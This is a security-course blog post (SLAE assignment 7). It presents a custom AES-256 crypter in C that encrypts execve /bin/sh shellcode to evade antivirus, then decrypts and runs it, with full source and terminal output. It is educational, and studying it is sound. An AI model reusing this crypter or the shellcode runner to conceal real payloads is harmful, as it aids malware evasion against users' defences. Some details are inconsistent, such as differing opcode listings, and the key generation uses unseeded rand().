---
layout: post
title: SLAE Assignment 7 - Crypters
date: '2016-12-07T18:40:00.000-06:00'
author: Sanjiv Kawa
tags:
- SLAE
- SecurityTube
- Assignment
- Shellcode
- nasm
- assembly
- crypter
comments: true
---

### SLAE Assignment Stub
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>

Student ID: SLAE-807


### Assignment 7 Requirements
- Create a custom crypter
- Feel free to use any encryption schema
- Use any programming language


### Crypters
Crypters are a program that encrypt an executable or shellcode and decrypt the executable or shellcode at run time. The goal of crypters is to evade antivirus detection.

For this assignment, I decided to write the crypter in C and use the <a href="https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption">OpenSSL EVP</a> symmetric cipher routine. The encryption algorithm that was chosen is AES-256 with an 128 bit initialization vector in CBC mode.

### The Shellcode
The example shellcode I will be using is a really simple stack-based `execve` SYSCALL that executes `/bin/sh`.

The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here<a>.


Here are the opcodes:

~~~ bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
~~~

### encrypt.c
encrypt.c is responsible for taking user supplied shellcode and encrypting using a 256 bit AES key and 128 bit initialization vector. Both the AES key and IV are randomly generated.

encrypt.c can be found <a href="https://github.com/skahwah/slae/blob/master/assignment7/encrypt.c">here</a>.

Below is an explanation of encrypt.c

~~~ c
/*
encrypt.c
Sanjiv Kawa (@skawasec)
www.popped.io
December 7, 2016

This program encrypts user supplied shellcode.
Please use decrypt.c to decrypt and execute the shellcode.

compile: encrypt.c -l crypto -o encrypt
*/

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

//print shellcode in \x format
void print_shellcode(unsigned char *shellcode)
{
  int i, len;

  len = strlen(shellcode);

  for (i = 0; i < len; i++)
  {
    printf("\\x%02x", shellcode[i]);
  }
    printf("\n");
}

//generate a random string for AES key and initialization vector
//modified http://codereview.stackexchange.com/questions/29198/random-string-generator-in-c
static char *random_string(char *str, size_t size)
{
  const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  int i, n;
  n = 0;

  for (i = 0; n < size; n++)
  {
    int key = rand() % (int) (sizeof charset - 1);
    str[n] = charset[key];
  }

  str[size] = '\0';

  return str;
}

//main
int main (void)
{
  unsigned char key[32]; //256 bit key
  unsigned char iv[16]; //128 bitinitialization vector

  int key_len, iv_len;
  key_len = 32;
  iv_len = 16;

  random_string(key, key_len); //generate random AES 256 bit key
  random_string(iv, iv_len); //generate random AES 128 bit initialization vector

  printf("[+] AES 128 bit IV: %s\n", (iv));
  printf("[+] AES 256 bit Key: %s\n", (key));

  //plaintext shellcode
  unsigned char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

  unsigned char encrypted[128]; //buffer for encrypted shellcode
  int shellcode_len, encrypted_len; //length of shellcode

  shellcode_len = strlen(shellcode);

  //initialize the library
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  //encrypt the shellcode
  encrypted_len = encrypt(shellcode, shellcode_len, key, iv, encrypted);

  //null terminate the shellcode for printing
  shellcode[shellcode_len] = '\0';
  encrypted[encrypted_len] = '\0';

  //print shellcode in both forms
  printf("[+] Original Shellcode (%d bytes):\n", (shellcode_len));
  print_shellcode(shellcode);

  printf("[+] Encrypted Shellcode (%d bytes):\n", (encrypted_len));
  print_shellcode(encrypted);

  //clean up
  EVP_cleanup();
  ERR_free_strings();

  return 0;
}

//error handler
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

//encryption function for AES 256 with a 128 bit initialization vector
int encrypt(unsigned char *shellcode, int shellcode_len, unsigned char *key, unsigned char *iv, unsigned char *encrypted)
{
  EVP_CIPHER_CTX *ciphertext; //openssl EVP ciphertext structure

  int len, encrypted_len;

  //create and initialize the context
  if(!(ciphertext = EVP_CIPHER_CTX_new()))
    handleErrors(); //error handler

  //initialize the encryption operation for AES 256 with a 128 bit initialization vector
  EVP_EncryptInit_ex(ciphertext, EVP_aes_256_cbc(), NULL, key, iv);

  EVP_EncryptUpdate(ciphertext, encrypted, &len, shellcode, shellcode_len); //encrypt shellcode

  encrypted_len = len; //encrypted shellcode length

  EVP_EncryptFinal_ex(ciphertext, encrypted + len, &len); //finalize encryption

  encrypted_len += len; //encrypted shellcode length

  EVP_CIPHER_CTX_free(ciphertext); //clean up

  return encrypted_len;
}
~~~


### decrypt.c
decrypt.c is responsible for taking the 256 bit AES key and 128 bit initialization vector used to encrypt the shellcode string as well as the encrypted shellcode string and decrypting it to it's original form.

After decrypting the shellcode, decrypt.c continues to execute the shellcode and use the stack-based `execve` syscall to execute `/bin/sh`.

decrypt.c can be found <a href="https://github.com/skahwah/slae/blob/master/assignment7/decrypt.c">here</a>.

Below is an explanation of decrypt.c

~~~ c
/*
decrypt.c
Sanjiv Kawa (@skawasec)
www.popped.io
December 7, 2016

This program decrypts and executes the shellcode encrypted by encrypt.c

Compile: gcc -fno-stack-protector -z execstack decrypt.c -l crypto -o decrypt
*/

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <time.h>

//print shellcode in \x format
void print_shellcode(unsigned char *shellcode)
{
  int i, len;

  len = strlen(shellcode);

  for (i = 0; i < len; i++)
  {
    printf("\\x%02x", shellcode[i]);
  }
    printf("\n");
}

//execute shellcode
void execute_shellcode(unsigned char *shellcode)
{
  printf("\n");
  int (*ret)() = (int(*)())shellcode;
  ret();
}

//main
int main (void)
{
  unsigned char decrypted[128]; //buffer for decrypted shellcode
  int decrypted_len, encrypted_len; //length of shellcode


  //128 bit AES initialization vector used to encrypt the shellcode
  unsigned char iv[] = "KSB1FebW397VI5uG";

  //256 bit AES key used to encrypt the shellcode
  unsigned char key[] = "PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw";

  //encrypted shellcode
  unsigned char encrypted[] = "\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70";

  //length of encrypted shellcode
  encrypted_len = strlen(encrypted);

  printf("[+] Encrypted Shellcode (%d bytes):\n", (encrypted_len));
  print_shellcode(encrypted);

  printf("[+] AES 128 bit IV: %s\n", (iv));
  printf("[+] AES 256 bit Key: %s\n", (key));

  //initialize the library
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  //decrypt the shellcode
  decrypted_len = decrypt(encrypted, encrypted_len, key, iv, decrypted);

  //null terminate the shellcode for printing
  decrypted[decrypted_len] = '\0';

  printf("[+] Decrypted Shellcode (%d bytes):\n", (decrypted_len));
  print_shellcode(decrypted);

  //clean up
  EVP_cleanup();
  ERR_free_strings();

  printf("[+] Executing Shellcode:\n");
  //execute shellcode
  execute_shellcode(decrypted);

  return 0;
}

//error handler
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

//decryption function for AES 256 with a 128 bit initialization vector
int decrypt(unsigned char *encrypted, int encrypted_len, unsigned char *key, unsigned char *iv, unsigned char *decrypted)
{
  EVP_CIPHER_CTX *ciphertext; //openssl EVP ciphertext structure

  int len, decrypted_len;

  //create and initialize the context
  if(!(ciphertext = EVP_CIPHER_CTX_new()))
    handleErrors(); //error handler

  //initialize the decryption operation for AES 256 with a 128 bit initialization vector
  EVP_DecryptInit_ex(ciphertext, EVP_aes_256_cbc(), NULL, key, iv);

  EVP_DecryptUpdate(ciphertext, decrypted, &len, encrypted, encrypted_len); //decrypt shellcode

  decrypted_len = len; //decrypted shellcode length

  EVP_DecryptFinal_ex(ciphertext, decrypted + len, &len); //finalize encryption

  decrypted_len += len; //decrypted shellcode length

  EVP_CIPHER_CTX_free(ciphertext); //clean up

  return decrypted_len;
}
~~~

### Compiling and Executing
First, encrypt.c is compiled and then executed. The 256 bit AES key and 128 bit initialization vector used to encrypt the shellcode are displayed, along with the shellcode in it's original and encrypted forms.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ gcc encrypt.c -l crypto -o encrypt
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ ./encrypt
[+] AES 128 bit IV: KSB1FebW397VI5uG
[+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
[+] Original Shellcode (25 bytes):
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
[+] Encrypted Shellcode (32 bytes):
\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70
~~~

Second, the 256 bit AES key, 128 bit initialization vector and encrypted shellcode are all placed into decrypt.c

decrypt.c then uses the aforementioned key and IV to decrypt the encrypted shellcode and display the shellcode in it's original form. The `execute_shellcode` function is then called and passes control of the program to the shellcode, this continues to use `execve` to execute `/bin/sh`.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ gcc encrypt.c -l crypto -o encrypt
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ ./encrypt
[+] AES 128 bit IV: KSB1FebW397VI5uG
[+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
[+] Original Shellcode (25 bytes):
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
[+] Encrypted Shellcode (32 bytes):
\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ vim decrypt.c
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ cat decrypt.c | grep "iv\[\]"
  unsigned char iv[] = "KSB1FebW397VI5uG";
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ cat decrypt.c | grep "key\[\]"
  unsigned char key[] = "PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw";
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ cat decrypt.c | grep "encrypted\[\]"
  unsigned char encrypted[] = "\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70";
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ gcc -fno-stack-protector -z execstack decrypt.c -l crypto -o decrypt
skawa@ubuntu:~/Desktop/code/assignment/assignment7$ ./decrypt
[+] Encrypted Shellcode (32 bytes):
\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70
[+] AES 128 bit IV: KSB1FebW397VI5uG
[+] AES 256 bit Key: PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw
[+] Decrypted Shellcode (25 bytes):
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
[+] Executing Shellcode:

$
~~~
